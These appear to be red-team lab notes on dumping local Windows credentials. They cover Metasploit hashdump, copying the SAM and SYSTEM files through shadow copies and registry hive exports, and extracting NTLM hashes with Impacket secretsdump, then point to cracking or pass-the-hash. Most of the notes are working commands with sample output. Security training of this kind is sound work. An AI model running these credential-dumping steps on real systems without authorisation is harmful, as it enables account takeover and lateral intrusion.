# Credentials Harvesting: Local Windows Credentials

Windows provides two types of user accounts: **Local** and **Domain**. Local user details are stored on the machine, while domain user details are managed in Active Directory. This guide focuses on harvesting credentials for local user accounts.

---

## 1. Keystrokes

A **keylogger** is a tool (software or hardware) that records keyboard activity. While keyloggers have legitimate uses (e.g., parental control, software feedback), they are often misused to steal credentials. As a red teamer, deploying a keylogger on a compromised system can help capture user credentials, especially in interactive environments.

> **Tip:** Tools like Metasploit can be used for keylogging. For practical examples, see the "THM Exploiting AD (Task 5)" room.

---

## 2. Security Account Manager (SAM)

The **SAM** database stores local account information (usernames, password hashes) in an encrypted format. It is locked while Windows is running, but there are several ways to dump its contents.

### Confirming No Access to the SAM Database

```shell
C:\Windows\system32>type c:\Windows\System32\config\sam
The process cannot access the file because it is being used by another process.

C:\Windows\System32>copy c:\Windows\System32\config\sam C:\Users\Administrator\Desktop\
The process cannot access the file because it is being used by another process.
    0 file(s) copied.
```

---

### 2.1 Metasploit's HashDump

Metasploit's `hashdump` feature injects code into the `LSASS.exe` process to extract hashes from the SAM database.

```shell
meterpreter > getuid
Server username: THM\Administrator
meterpreter > hashdump
Administrator:500:aad3b435b51404eeaad3b435b51404ee:98d3b784d80d18385cea5ab3aa2a4261:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:ec44ddf5ae100b898e9edab74811430d:::
CREDS-HARVESTIN$:1008:aad3b435b51404eeaad3b435b51404ee:443e64439a4b7fe780db47fc06a3342d:::
```

---

### 2.2 Volume Shadow Copy Service

The **Volume Shadow Copy Service** allows you to create backups of files that are in use. You can use this to copy the SAM database.

#### Steps:

1. **Run cmd.exe as Administrator**
2. **Create a shadow copy:**
    ```shell
    wmic shadowcopy call create Volume='C:\'
    ```
    Example output:
    ```
    Method execution successful.
    ShadowID = "{D8A11619-474F-40AE-A5A0-C2FAA1D78B85}";
    ```

3. **List shadow copies:**
    ```shell
    vssadmin list shadows
    ```
    Look for the `Shadow Copy Volume` path, e.g.:
    ```
    \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1
    ```

4. **Copy the SAM and SYSTEM files:**
    ```shell
    copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\windows\system32\config\sam C:\users\Administrator\Desktop\sam
    copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\windows\system32\config\system C:\users\Administrator\Desktop\system
    ```

5. **Transfer files to your attack machine (e.g., via SCP).**

---

### 2.3 Registry Hives

The Windows Registry also stores copies of the SAM and SYSTEM files. You can export them using `reg.exe` (run as Administrator):

```shell
reg save HKLM\sam C:\users\Administrator\Desktop\sam-reg
reg save HKLM\system C:\users\Administrator\Desktop\system-reg
```

---

## 3. Decrypting SAM Hashes with Impacket

Once you have the SAM and SYSTEM files, use Impacket's `secretsdump.py` to extract hashes:

```shell
python3.9 /opt/impacket/examples/secretsdump.py -sam /tmp/sam-reg -system /tmp/system-reg LOCAL
```

Example output:
```
[*] Target system bootKey: 0x36c8d26ec0df8b23ce63bcefa6e2d821
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:98d3a787a80d08385cea7fb4aa2a4261:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
```

> **Note:** The output may differ from Metasploit's hashdump if some accounts are domain accounts. To decrypt domain account hashes, you also need the `SECURITY` file.

---

## 4. Cracking Hashes

Once you have NTLM hashes, you can attempt to crack them with tools like **Hashcat** or use them for pass-the-hash attacks.

---

**Summary:**  
- Use keyloggers for live credential capture.
- Dump the SAM database via Metasploit, Volume Shadow Copy, or Registry.
- Decrypt hashes with Impacket.
- Crack or use hashes for further attacks.
